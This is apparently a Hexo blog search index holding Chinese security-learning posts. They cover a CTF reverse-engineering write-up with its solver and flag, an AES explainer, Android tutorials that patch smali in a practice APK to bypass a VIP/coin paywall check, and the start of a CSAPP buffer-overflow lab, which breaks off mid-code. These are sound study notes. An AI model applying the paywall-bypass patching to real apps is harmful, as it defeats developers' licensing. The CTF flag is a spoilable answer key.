<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2022极客大挑战</title>
    <url>/2022/12/21/2022%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>2023柏鹭杯rev1-wp</title>
    <url>/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/</url>
    <content><![CDATA[<p>可以看到要求的输入长度是64个字符，前面是简单的验证输入的字符是否合规，红框圈起来的函数是主加密函数，下面可以不用分析了。</p>
<span id="more"></span>

<p><img src="/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/QQ%E6%88%AA%E5%9B%BE20231011202957.png"></p>
<p>动态调试F7步入函数。</p>
<p>加密部分可以划分为三块，每一块都是用AVX2汇编实现的，类似于进行了内联汇编。这是第一部分，将我们的输入与ebp-40处开始的32个字节进行异或操作并保存到ymm0处。<img src="/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/QQ%E6%88%AA%E5%9B%BE20231011203337.png"></p>
<p>第二部分是使用vphufb根据ebp-60处的32字节对ymm0处存放的数据进行重排。</p>
<p><img src="/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/QQ%E6%88%AA%E5%9B%BE20231011203404.png"></p>
<p>c语言代码表示vpshufb ymm0, ymm0 , index</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">for (int i <span class="operator">=</span> <span class="number">0</span><span class="comment">; i &lt; 32; ++i)</span></span><br><span class="line">   &#123;</span><br><span class="line">       ymm0[i] <span class="operator">=</span> ymm0[index[i]]<span class="comment">;</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>最后是比较部分，ebp-20处存放的是比较数据。</p>
<p><img src="/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/QQ%E6%88%AA%E5%9B%BE20231011203428.png"></p>
<p>那么逆向过程就是：</p>
<ol>
<li>提取比较数据</li>
<li>重排</li>
<li>异或</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//加密过程</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> xordata[<span class="number">32</span>] = &#123;      <span class="comment">//异或数据，与input进行异或</span></span><br><span class="line">    <span class="number">0xCD</span>, <span class="number">0xEB</span>, <span class="number">0x5E</span>, <span class="number">0x76</span>, <span class="number">0x0F</span>, <span class="number">0x22</span>, <span class="number">0xAF</span>, <span class="number">0x31</span>, <span class="number">0x82</span>, <span class="number">0x92</span>, <span class="number">0x3C</span>, <span class="number">0xEF</span>, <span class="number">0xB8</span>, <span class="number">0xC1</span>, <span class="number">0x76</span>, <span class="number">0x06</span>, </span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x2F</span>, <span class="number">0xB5</span>, <span class="number">0x7D</span>, <span class="number">0x7F</span>, <span class="number">0x0A</span>, <span class="number">0xEA</span>, <span class="number">0x85</span>, <span class="number">0x92</span>, <span class="number">0x00</span>, <span class="number">0x89</span>, <span class="number">0xA3</span>, <span class="number">0x2C</span>, <span class="number">0xE2</span>, <span class="number">0xE7</span>, <span class="number">0x32</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> changedata[<span class="number">32</span>] = &#123;     <span class="comment">//重排表</span></span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x0F</span>, <span class="number">0x08</span>, <span class="number">0x0C</span>, </span><br><span class="line">    <span class="number">0x1B</span>, <span class="number">0x18</span>, <span class="number">0x17</span>, <span class="number">0x1F</span>, <span class="number">0x14</span>, <span class="number">0x1E</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x15</span>, <span class="number">0x1D</span>, <span class="number">0x16</span>, <span class="number">0x1C</span>, <span class="number">0x11</span>, <span class="number">0x10</span>, <span class="number">0x19</span>, <span class="number">0x1A</span>&#125;; </span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> cmpdata[<span class="number">32</span>] = &#123;     <span class="comment">//比较数据</span></span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0x91</span>, <span class="number">0x99</span>, <span class="number">0xE8</span>, <span class="number">0x4E</span>, <span class="number">0xD0</span>, <span class="number">0xB0</span>, <span class="number">0x92</span>, <span class="number">0xB1</span>, <span class="number">0x3C</span>, <span class="number">0x4F</span>, <span class="number">0xF4</span>, <span class="number">0x17</span>, <span class="number">0x76</span>, <span class="number">0xDA</span>, <span class="number">0x12</span>, </span><br><span class="line">    <span class="number">0x2A</span>, <span class="number">0x35</span>, <span class="number">0x01</span>, <span class="number">0x15</span>, <span class="number">0xF9</span>, <span class="number">0x97</span>, <span class="number">0x5E</span>, <span class="number">0x19</span>, <span class="number">0x9D</span>, <span class="number">0xC2</span>, <span class="number">0x15</span>, <span class="number">0x99</span>, <span class="number">0x70</span>, <span class="number">0x7D</span>, <span class="number">0x9F</span>, <span class="number">0xCC</span>&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> flag[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[changedata[<span class="number">31</span>-i]]=cmpdata[<span class="number">31</span>-i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">32</span>;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[j]=flag[j]^xordata[j];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>,flag[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//825A10C618D636A058AE633FAA539E70655FEB648697FF84A79F4589B5207027</span></span><br><span class="line"><span class="comment">//flag&#123;ISEC-a49d6b847bdba62c5bfa0a43b69c8575&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/QQ%E6%88%AA%E5%9B%BE20231012145355.png"></p>
<p>逆向过程没啥障碍，写脚本的时候<code>flag[changedata[31-i]]=cmpdata[31-i];</code>31写成了32，造成了越界，但是非常的不明显<img src="/2023/10/12/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/QQ%E6%88%AA%E5%9B%BE20231012145647.png"></p>
<p>离谱的是vscode有时候能跑起来有时候跑不起来，这里记录一下，以后注意这个问题，可能需要安装一个检测这种小错误的插件。</p>
]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>AES算法</title>
    <url>/2023/08/18/AES%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="算法简介"><a href="#算法简介" class="headerlink" title="算法简介"></a>算法简介</h2><p>AES（Advanced Encryption Standard，高级加密标准），不同于RC4这种流加密算法，AES属于<strong>块加密</strong>算法，其分组长度固定为128位，仅支持128位、192位、256位的密钥长度（密钥长度每增加64位，算法的循环次数增加两轮，10、12、14），分别称为AES-128、AES-192、AES-256。AES是一种<strong>对称加密</strong>算法。</p>
<span id="more"></span>

<p>下面以明文和密钥都是128位来举例。</p>
<h2 id="存储形式"><a href="#存储形式" class="headerlink" title="存储形式"></a>存储形式</h2><p>16字节的明文以4*4矩阵的形式存储。按照从上至下从左至右的顺序存储。<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803174932.png"></p>
<h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><p>明文经过<strong>初始变化</strong>然后经过<strong>九轮的循环运算</strong>再经过一轮的<strong>最终轮</strong>运算即可得到密文。</p>
<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803175347.png"></p>
<p>最终轮相较于九轮循环运算少了列混合的过程，其余三个过程相同。</p>
<h3 id="初始变换（Intial-round）"><a href="#初始变换（Intial-round）" class="headerlink" title="初始变换（Intial round）"></a>初始变换（Intial round）</h3><p>明文和<strong>子密钥</strong>存储在矩阵按字节进行异或，这一过程称为初始变换</p>
<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803175921.png"></p>
<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803180107.png"></p>
<h3 id="九轮循环运算"><a href="#九轮循环运算" class="headerlink" title="九轮循环运算"></a>九轮循环运算</h3><p>分为四个步骤<strong>字节代换</strong>、<strong>行移位</strong>、<strong>列混合</strong>、<strong>轮密钥加</strong></p>
<h4 id="字节代换"><a href="#字节代换" class="headerlink" title="字节代换"></a>字节代换</h4><p>简单来讲就是对初始变换后的明文进行查表替换，这个表就是S-box</p>
<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803180404.png"></p>
<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803180620.png"></p>
<p>比如初始矩阵为</p>
<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803180742.png"></p>
<p>第一个元素19，对应S表第一行第九列的元素d4，按照此规律进行全部的替换</p>
<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803181034.png"></p>
<p>S-box不是固定不变的，也就是说S-box部分可以被魔改，但是不能随意更改，要符合S-box的设计规范。</p>
<h4 id="行移位"><a href="#行移位" class="headerlink" title="行移位"></a>行移位</h4><p>矩阵第一行不变，第二行左移一个字节，第三行左移两个字节，第三行左移三个字节</p>
<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803181615.png"></p>
<h4 id="列混合"><a href="#列混合" class="headerlink" title="列混合"></a>列混合</h4><p>将输入矩阵<strong>左乘</strong>一个给定的4*4矩阵，但是这里的矩阵相乘的<strong>加</strong>和<strong>乘</strong>的规则不同于我们在线代课上接触的。</p>
<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803181829.png"></p>
<h5 id="加和乘规则"><a href="#加和乘规则" class="headerlink" title="加和乘规则"></a>加和乘规则</h5><p>简单来讲把<strong>加</strong>替换为了<strong>异或</strong>操作<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803200828.png"></p>
<p>对于<strong>乘法</strong>，我们就将其规则记作下面的 ” · “再mod上m(x)吧！！！因为是在有限域2^8中，所以最终的结果不能存在大于等于八的次数<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803235059.png"></p>
<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803205004.png"></p>
<p>经过列混合得到<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803205352.png"></p>
<h4 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h4><p>将得到的矩阵与<strong>子密钥矩阵</strong>进行异或 </p>
<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803182348.png"></p>
<h3 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h3><p>上述的过程所提及的密钥都是子密钥矩阵，子密钥矩阵是初始密钥矩阵通过密钥扩展得到的，密钥矩阵经密钥扩展得到十个子密钥矩阵，运用到十次加密中（九轮循环+最终轮）<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803184432.png"></p>
<p>前四列是初始的，后面的都是计算得来的，计算时讨论下标是不是4的倍数。</p>
<p><strong>T函数</strong> ：字循环、字节代换、轮常量异或</p>
<p>字循环：将一列的四个字节循环左移一个字节如【b0,b1,b2,b3】–&gt;【b1,b2,b3,b0】</p>
<p>字节代换：查S盒进行代换</p>
<p>轮常量异或：给定10列常量。将前两步得到的结果与轮常量Rcon[j]进行异或，j表示轮数。轮常量数组中的每一个元素为一个32位的双字，且低24位恒为0.高八位（1字节）按如下规则定义：Rcon[1]&#x3D;1,Rcon[i]&#x3D;2*Rcon[i-1]<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803200147.png"></p>
<p>重复扩展过程得到全部的子密钥矩阵<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803200329.png"></p>
<h2 id="算法特征"><a href="#算法特征" class="headerlink" title="算法特征"></a>算法特征</h2><p>128位（16字节）一组、S-box、列混合、行移位等过程</p>
<p>可以进行<strong>魔改</strong>的部分：S-box、列混合、轮密钥加、行移位等过程的顺序可以进行调整。</p>
]]></content>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>Android学习篇（一）</title>
    <url>/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h3 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h3><p>APK 的全称是 Android Package，它扩展名为 .apk。APK 是 Android 应用程序的包文件格式。它是 Android 操作系统上安装应用程序的文件类型。APK 实际上是一个<strong>压缩包</strong>，其中包含了应用程序的所有文件，包括代码、资源、图像、音频和其他数据。APK 文件是将应用程序打包并分发到 Android 设备上的主要方式。在电脑上只要将.apk后缀改为7z就可以用压缩工具打开了。</p>
<span id="more"></span>

<table>
<thead>
<tr>
<th>文件</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>assets 目录</td>
<td>这个目录用于存放APK的静态资源文件，如视频、音频、图片等，存放的是<strong>未经编译处理</strong>的原始文件</td>
</tr>
<tr>
<td>lib 目录</td>
<td>这个目录包含了针对不同 CPU 架构的本地代码库文件。</td>
</tr>
<tr>
<td>META-INF 目录</td>
<td>这个目录包含了与 APK 文件的签名相关的信息，例如签名文件（.MF）、证书文件（.RSA 或 .DSA）等。这些文件用于验证 APK 文件的完整性和身份。</td>
</tr>
<tr>
<td>res 目录</td>
<td>用于存放编译后的资源文件的地方，例如图像、布局文件、字符串等。</td>
</tr>
<tr>
<td>AndroidManifest.xml 文件</td>
<td>这个文件是应用程序的清单文件，描述了应用程序的属性、权限、组件和其他重要信息。</td>
</tr>
<tr>
<td>classes.dex 文件</td>
<td>这个文件包含了应用程序的已编译 Java 代码，也就是Java的字节码文文件，是APK运行的主要逻辑。</td>
</tr>
<tr>
<td>resources.arsc 文件</td>
<td>这个文件是资源表文件，包含了应用程序使用的所有资源的索引和定义。</td>
</tr>
</tbody></table>
<h3 id="MT管理器"><a href="#MT管理器" class="headerlink" title="MT管理器"></a>MT管理器</h3><p>MT管理器（MT Manager）是一款功能强大的Android文件管理器和应用程序管理工具。它提供了许多高级功能和工具，可以帮助用户对安装在Android设备上的应用程序和文件进行管理、编辑、查看和修改。</p>
<h3 id="双开即原理"><a href="#双开即原理" class="headerlink" title="双开即原理"></a>双开即原理</h3><p>双开即在手机上打开两个相同应用，比如打开两个微信或者QQ。一台设备通常不允许两个名字相同的应用同时运行，因此我们可以通过修改包名的方法进行双开。</p>
<p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231014181313.png"></p>
<p>点击功能，点击APK共存，修改包名确定然后安装即可。最新版的np管理器不支持免费共存了，所以下载了一个旧版本，旧版本进去他会强制要求升级到最新版，然后我断开了模拟器的网络就可以正常使用了。</p>
<p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231014192339.png"></p>
<p>点开之后，成功运行。</p>
<h3 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h3><p>主要在后缀为arsc 、xml、dex的文件中</p>
<p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015022605.png"></p>
<p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231014192448.png"></p>
<p>将程序的英文部分翻译成中文呢，直接进入课程挑战<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231014192831.png"></p>
<p>进入mt管理器，选择安装包之后，右上角三道杠，选择查看，点击高级搜索，下面文本输入hello，然后就定位到了jf.xml，通过前面的学习，我们知道了<strong>res目录</strong>用于存放编译后的资源文件的地方，例如图像、布局文件、<strong>字符串</strong>等。</p>
<p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015014947.png">点击选择反编译,然后找到hello字符串修改成中文的<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015012902.png"></p>
<p>然后点击保存，并返回，勾选上自动签名，然后点击安装，发现安装失败，这是因为系统检测到了APK的签名发生了变化，我们可以通过卸载之前的应用避开这个问题，当然还有别的解决方案，只是现在为时尚早，就直接卸载再安装<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015014300.png"></p>
<p>你好 吾爱破解。</p>
<p>对于难以搜索的字符串，比如下面那句啥，俄语？</p>
<p>使用开发者助手</p>
<p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015020751.png"></p>
<p>可以直接复制，方法和上面类似，这一次定位到的是<strong>resources.arsc 文件</strong>  </p>
<p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015021522.png"></p>
<p>选择翻译模式，点击上方[default]，就能找到那个字符串，点击，写在翻译后，然乎确定保存并重新安装即可，这次发现不需要卸载应用那个步骤了，因为这两次的签名都是由mt提供的一个自带的签名信息。<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015021702.png"></p>
<p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015021948.png"></p>
<h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">定义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">versionCode</td>
<td align="left">版本号，主要用来更新，例如:12</td>
</tr>
<tr>
<td align="left">versionName</td>
<td align="left">版本名，给用户看的，例如:1.2</td>
</tr>
<tr>
<td align="left">package</td>
<td align="left">包名，例如：com.zj.52pj.demo</td>
</tr>
<tr>
<td align="left">uses-permission android:name&#x3D;””</td>
<td align="left">应用权限，例如：android.permission.INTERNET 代表网络权限</td>
</tr>
<tr>
<td align="left">android:label&#x3D;”@string&#x2F;app_name”</td>
<td align="left">应用名称</td>
</tr>
<tr>
<td align="left">android:icon&#x3D;”@mipmap&#x2F;ic_launcher”</td>
<td align="left">应用图标路径</td>
</tr>
<tr>
<td align="left">android:debuggable&#x3D;”true”</td>
<td align="left">应用是否开启debug权限</td>
</tr>
</tbody></table>
<p>跟着大佬学：<a href="https://www.52pojie.cn/thread-1695796-1-1.html">《安卓逆向这档事》二、初识APK文件结构、双开、汉化、基础修 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
]]></content>
      <tags>
        <tag>Android逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Android学习篇（二）</title>
    <url>/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<p>主要学习smali，通过实际上手修改smali代码加深理解。</p>
<span id="more"></span>

<h3 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h3><p>JVM是Java虚拟机，运行Java字节码程序。</p>
<h3 id="Dalvik"><a href="#Dalvik" class="headerlink" title="Dalvik"></a>Dalvik</h3><p>Dalvik是Google专门为Android设计的一个虚拟机，Dalvik有专属的文件执行格式dex(Dalvik executable)。</p>
<h3 id="smali及其语法"><a href="#smali及其语法" class="headerlink" title="smali及其语法"></a>smali及其语法</h3><p>smali是Dalvik的寄存器语言，smali代码是dex反编译而来的。可以把Dalvik理解成x86，那么smali就是x86汇编。在反编译的时候不能修改该java代码，只能修改smali代码。</p>
<h3 id="jadx"><a href="#jadx" class="headerlink" title="jadx"></a>jadx</h3><p>分析apk的工具，可以理解为分析java的ida。</p>
<h3 id="vip终结"><a href="#vip终结" class="headerlink" title="vip终结"></a>vip终结</h3><p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015181533.png"></p>
<p>任务是一键三连，但是他弹窗提醒需要充值大会员，直接在jadx中使用搜索功能，搜索大会员。直接定位到这段代码。<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015181807.png"></p>
<p>首先他会判断我们的硬币数量，在判断我们是不是vip，解决方法</p>
<ol>
<li>进入这个方法之后直接goto到 ChallengeSecond challengeSecond2 &#x3D; challengeSecond;</li>
<li>修改硬币和isvip的判断</li>
<li>修改寄存器中的值</li>
</ol>
<h4 id="通过修改判断"><a href="#通过修改判断" class="headerlink" title="通过修改判断"></a>通过修改判断</h4><p>jadx不支持修改代码，要使用mt管理器，提取apk文件并定位，反编译dex文件，搜索硬币，点击进入<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015182756.png"></p>
<p>if-ge全称greater equal(a&gt;&#x3D;b)，a大于或等于则跳，在mt里直接修改成if-le也就是小于等于即可，这样我们就会直接跳转到标签cood_15处，下面看isvip判断<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015183442.png"></p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">if</span>-eqz <span class="built_in">p0</span>, :cond_43</span><br></pre></td></tr></table></figure>

<p>如果p0等于0则跳转到cond_43处，而cood_43是提示请充值大会员的标签，所以我们可以选择直接注释掉这段代码，这样就不会发生跳转，或者讲逻辑改成不等于0.</p>
<p>保存并重新安装即可。</p>
<p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015184145.png"></p>
<h4 id="通过修改寄存器的值"><a href="#通过修改寄存器的值" class="headerlink" title="通过修改寄存器的值"></a>通过修改寄存器的值</h4><p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015185249.png"></p>
<p>p0是我们的硬币数量，v0被赋成了10，我们只需要将 const&#x2F;16 v0, 0xa改成 const&#x2F;16 v0, 0x0即可。下面跳转到isvip判断，长按点击跳转<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015185439.png"></p>
<p>逻辑是这样的<img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015185509.png"></p>
<p>也就是返回0即假，直接const&#x2F;4 v0,0x1即可</p>
<h4 id="强制跳转"><a href="#强制跳转" class="headerlink" title="强制跳转"></a>强制跳转</h4><p>看一下goto的用法</p>
<p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015185904.png"></p>
<p>直接照着葫芦画瓢</p>
<p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015190518.png"></p>
<p><img src="/2023/10/15/Android%E5%AD%A6%E4%B9%A0%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/QQ%E6%88%AA%E5%9B%BE20231015190620.png"></p>
<p>成功。</p>
]]></content>
      <tags>
        <tag>Android逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Attack_lab</title>
    <url>/2023/08/26/Attack-lab/</url>
    <content><![CDATA[<p>这个实验非常有意思，了解一下缓冲区溢出相关的知识就可以开始了。</p>
<p>​                                                        !  ^_^ !</p>
<span id="more"></span>

<p><strong>文件信息：</strong></p>
<p>argetk中的文件包括:<br>README.txt：描述目录内容的文件<br>ctarget：易受代码注入攻击的可执行程序<br>rtarget：易受面向返回编程攻击的可执行程序<br>cookie.txt：8位十六进制代码，您将在攻击中使用它作为唯一标识符。<br>farm.c：目标“gadget farm”的源代码，您将使用它生成面向返回的编程攻击。<br>hex2raw：生成攻击字符串的实用程序。</p>
<p><a href="https://blog.csdn.net/weixin_43362650/article/details/121084611">《深入理解计算机系统》实验三Attack Lab下载和官方文档机翻_Addyz的博客-CSDN博客</a></p>
<p>看官方文档说是要以csapp3.10.3–3.10.4作为参考，这两个小节主要讲了<strong>缓冲区溢出</strong>和保护机制。</p>
<h3 id="缓冲区溢出："><a href="#缓冲区溢出：" class="headerlink" title="缓冲区溢出："></a>缓冲区溢出：</h3><h3 id="对抗缓冲区溢出攻击："><a href="#对抗缓冲区溢出攻击：" class="headerlink" title="对抗缓冲区溢出攻击："></a>对抗缓冲区溢出攻击：</h3><h4 id="栈随机化："><a href="#栈随机化：" class="headerlink" title="栈随机化："></a>栈随机化：</h4><p>栈的位置每次运行都有变化，因此很多地址不能确定，代码不能实现跳转。实现的方法是在程序开始时，在栈上分配一段0~n字节之间随机大小的空间。</p>
<h4 id="金丝雀值-canary"><a href="#金丝雀值-canary" class="headerlink" title="金丝雀值(canary):"></a>金丝雀值(canary):</h4><p>在栈的缓冲区开始的位置填充一个值，每次函数调用这个数值要和数据段中的一个不可更改的值进行比较，一旦发生缓冲区溢出，cannary值就会发生变化，从而结束程序。</p>
<h4 id="限制可执行代码区域："><a href="#限制可执行代码区域：" class="headerlink" title="限制可执行代码区域："></a>限制可执行代码区域：</h4><p>栈空间被设置为不可执行属性，所以不能直接在输入的字符中创建shellcode，要通过rop才能实行攻击。</p>
<h3 id="实验部分1代码注入攻击："><a href="#实验部分1代码注入攻击：" class="headerlink" title="实验部分1代码注入攻击："></a>实验部分1代码注入攻击：</h3><h4 id="Level1"><a href="#Level1" class="headerlink" title="Level1:"></a>Level1:</h4><p>test 调用完getbuf，使getbuf 返回执行touch1 而不是返回test 。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.Getbuf returned 0x%x\n&quot;</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!:You called touch1()\n&quot;</span>);</span><br><span class="line">    <span 